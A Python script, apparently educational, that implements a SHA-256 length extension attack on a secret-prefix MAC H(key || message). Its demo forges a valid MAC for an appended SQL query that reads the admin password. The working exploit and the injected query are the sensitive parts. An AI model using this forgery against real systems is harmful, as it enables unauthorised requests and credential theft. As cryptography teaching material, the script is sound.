#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Apr 24 15:41:21 2020

@author: Ibrahim BAMBA (ikader737@gmail.com)
"""


"""This implementation of the SHA-256 algorithm is from 
    https://github.com/keanemind/Python-SHA-256
    We’re going to modify the code so that we can pass in a SHA-256 a message 
    digest and ‘re-create’ its state for our Length Extension Attack
"""
from hashlib import sha256
import base64

#-------------------------BEGIN SHA256 IMPLEMENTATION--------------------------
K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 
    0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 
    0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 
    0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 
    0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 
    0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
]

def mySha256(message: bytearray, state=None, init_length = 0) -> bytearray:
    """Return a SHA-256 hash from the message passed.
    The argument should be a bytes, bytearray, or
    string object."""

    if isinstance(message, str):
        message = bytearray(message, 'ascii')
    elif isinstance(message, bytes):
        message = bytearray(message)
    elif not isinstance(message, bytearray):
        raise TypeError

    # Padding
    length = (len(message) + init_length) * 8 # len(message) is number of BYTES!!!
    message.append(0x80)
    while ((len(message) + init_length) * 8 + 64) % 512 != 0:
        message.append(0x00)

    message += length.to_bytes(8, 'big') # pad to 8 bytes or 64 bits

    assert ((len(message) + init_length) * 8) % 512 == 0, "Padding did not complete properly!"

    # Parsing
    blocks = [] # contains 512-bit chunks of message
    for i in range(0, len(message), 64): # 64 bytes is 512 bits
        blocks.append(message[i:i+64])

    # DONE HERE
    # Setting Initial Hash Value
    if(state == None):
        h0 = 0x6a09e667
        h1 = 0xbb67ae85
        h2 = 0x3c6ef372
        h3 = 0xa54ff53a
        h5 = 0x9b05688c
        h4 = 0x510e527f
        h6 = 0x1f83d9ab
        h7 = 0x5be0cd19
    else: # Going from a state
        h0 = state[0]
        h1 = state[1]
        h2 = state[2]
        h3 = state[3]
        h4 = state[4]
        h5 = state[5]
        h6 = state[6]
        h7 = state[7]

    # SHA-256 Hash Computation
    for message_block in blocks:
        # Prepare message schedule
        message_schedule = []
        for t in range(0, 64):
            if t <= 15:
                # adds the t'th 32 bit word of the block,
                # starting from leftmost word
                # 4 bytes at a time
                message_schedule.append(bytes(message_block[t*4:(t*4)+4]))
            else:
                term1 = _sigma1(int.from_bytes(message_schedule[t-2], 'big'))
                term2 = int.from_bytes(message_schedule[t-7], 'big')
                term3 = _sigma0(int.from_bytes(message_schedule[t-15], 'big'))
                term4 = int.from_bytes(message_schedule[t-16], 'big')

                # append a 4-byte byte object
                schedule = \
                ((term1 + term2 + term3 + term4) % 2**32).to_bytes(4, 'big')
                message_schedule.append(schedule)

        assert len(message_schedule) == 64

        # Initialize working variables
        a = h0
        b = h1
        c = h2
        d = h3
        e = h4
        f = h5
        g = h6
        h = h7

        # Iterate for t=0 to 63
        for t in range(64):
            t1 = ((h + _capsigma1(e) + _ch(e, f, g) + K[t] +
                   int.from_bytes(message_schedule[t], 'big')) % 2**32)

            t2 = (_capsigma0(a) + _maj(a, b, c)) % 2**32

            h = g
            g = f
            f = e
            e = (d + t1) % 2**32
            d = c
            c = b
            b = a
            a = (t1 + t2) % 2**32

        # Compute intermediate hash value
        h0 = (h0 + a) % 2**32
        h1 = (h1 + b) % 2**32
        h2 = (h2 + c) % 2**32
        h3 = (h3 + d) % 2**32
        h4 = (h4 + e) % 2**32
        h5 = (h5 + f) % 2**32
        h6 = (h6 + g) % 2**32
        h7 = (h7 + h) % 2**32

#    print(h0, h1, h2, h3, h4, h5, h6, h7)

    return ((h0).to_bytes(4, 'big') + (h1).to_bytes(4, 'big') +
            (h2).to_bytes(4, 'big') + (h3).to_bytes(4, 'big') +
            (h4).to_bytes(4, 'big') + (h5).to_bytes(4, 'big') +
            (h6).to_bytes(4, 'big') + (h7).to_bytes(4, 'big'))

def _sigma0(num: int):
    """As defined in the specification."""
    num = (_rotate_right(num, 7) ^
           _rotate_right(num, 18) ^
           (num >> 3))
    return num

def _sigma1(num: int):
    """As defined in the specification."""
    num = (_rotate_right(num, 17) ^
           _rotate_right(num, 19) ^
           (num >> 10))
    return num

def _capsigma0(num: int):
    """As defined in the specification."""
    num = (_rotate_right(num, 2) ^
           _rotate_right(num, 13) ^
           _rotate_right(num, 22))
    return num

def _capsigma1(num: int):
    """As defined in the specification."""
    num = (_rotate_right(num, 6) ^
           _rotate_right(num, 11) ^
           _rotate_right(num, 25))
    return num

def _ch(x: int, y: int, z: int):
    """As defined in the specification."""
    return (x & y) ^ (~x & z)

def _maj(x: int, y: int, z: int):
    """As defined in the specification."""
    return (x & y) ^ (x & z) ^ (y & z)

def _rotate_right(num: int, shift: int, size: int = 32):
    """Rotate an integer right."""
    return (num >> shift) | (num << size - shift)

#-----------------------END SHA256 IMPLEMENTATION------------------------------

def sha256_padding(M, key_length) :
    """ Pad (key + message) to hash to have a length multiple of 512 bits 
        (following sha26 padding)
        @param key_length : length of the secret key (integer)
        @param M : the original request (str)
        @return (<key> + M + padding)
    """
    if isinstance(M, str):
        M = bytearray(M, 'ascii')
    elif isinstance(M, bytes):
        M = bytearray(M)
    elif not isinstance(M, bytearray):
        raise TypeError

    length = (len(M) + key_length) * 8 # len(message) is number of BYTES!!!
    M.append(0x80)
    while ((len(M) + key_length) * 8 + 64) % 512 != 0:
        M.append(0x00)

    M += length.to_bytes(8, 'big') # pad to 8 bytes or 64 bits

    assert ((len(M) + key_length) * 8) % 512 == 0, \
    "Padding did not complete properly!"
    return M

def reverse_internal_state(h) :
    """ Reverse the internal state of sha256
        From an hash of a message, give h0,..., h7 corresponding
        @param h : the hash (hexadecimal)
        @return h0,..., h7 corresponding to hash (integer table)
    """
    res = [0]*8
    res[0] = int(h[0:8], 16)
    res[1] = int(h[8:16], 16)
    res[2] = int(h[16:24], 16)
    res[3] = int(h[24:32], 16)
    res[4] = int(h[32:40], 16)
    res[5] = int(h[40:48], 16)
    res[6] = int(h[48:56], 16)
    res[7] = int(h[56:64], 16)
    return res

    
def length_extansion_attack(OM, OH, keylen, FM) :
    """ Implementation of the length extension attack against SHA256 MAC
        For authentification, server use H(key || original_request) 
        with H = sha256 as MAC and original_request = OM. 
        We will forge our pure valid MAC without knowing the key.
        We will forge MAC such that 
        sha256(key || OM || padding || FM) 
        is valid without the key
        @param OM : Original Message, the original request sent to the server 
                    (str)
        @param OH : Original Hash : the Hash-MAC of OM (hex)
        @param keylen : length of the key used to produce the MAC of OM (int)
        @param FM : Forged Message, the new request to forge for the attack 
                    (str)
        @return (attack_request, valid_forged_hash)
    """
    # first, we reverse the last state of the sha256 function 
    # when computed the hash of key+OM
    state = reverse_internal_state(OH)
    
    # then, we pad the original message to obtain the real message hashed 
    # by sha256
    OM_padded = sha256_padding(OM, keylen)
    
    # now, we forge a valid sha256 digest without the key
    FH = mySha256(FM, state, init_length=len(OM_padded)+keylen).hex()

    # finaly, we forge the message corresponding to FH
    _FM = OM_padded+bytearray(FM, 'ascii')
    
    print('FM = ', _FM)
    print('Its sha = ', sha256(_FM).hexdigest())
    return _FM, FH
    
def test() :
    """Suppose that in a computer system, any request to the database server 
    must be authenticated. For this, the security administrator has set up a 
    MAC authentication system. Any request must be transmitted with its MAC
    H(secret_key || request). Thus, only entities with the secret key can send 
    requests to the database. Suppose now that Eve managed to get a non-sensitive 
    request and its corresponding hash (by phishing for example). She wants to 
    send a very dangerous request to the database server"""

    key='mySuperKey'     # The secret key
    key_h=base64.b16decode(key.encode().hex(), casefold=True) # hash of the key
    # Non-sensitive request got by Eve
    M1='SELECT uid FROM Users WHERE name="Eve"'
    h=sha256()
    h.update(key_h)
    h.update(M1.encode())
    # Its hash with sha256
    h=h.hexdigest()
    print('ORIGINAL :', h)

    # Malicious request to thief admin password
    M2='; SELECT password FROM Users WHERE name = "admin"'
    # Its hash
    _M1 = sha256_padding(M1, len(key))
    
    # Eve attack the database with length extension attack
    FM,h2 = length_extansion_attack(M1, h, len(key), M2)
    
    print('FORGED :', FM)
    _M2 = bytearray(M2, 'ascii')
    # We verify here if the result of the hash of mailicious request sent by Eve
    # with the secret key is identical to the request forged by Eve without 
    # the key
    v=sha256(key_h+_M1+_M2).hexdigest()
    assert(h2 == v)
    print(h2)
    print("[+] ATTACK SUCCED")


if __name__ == '__main__' :
    test()
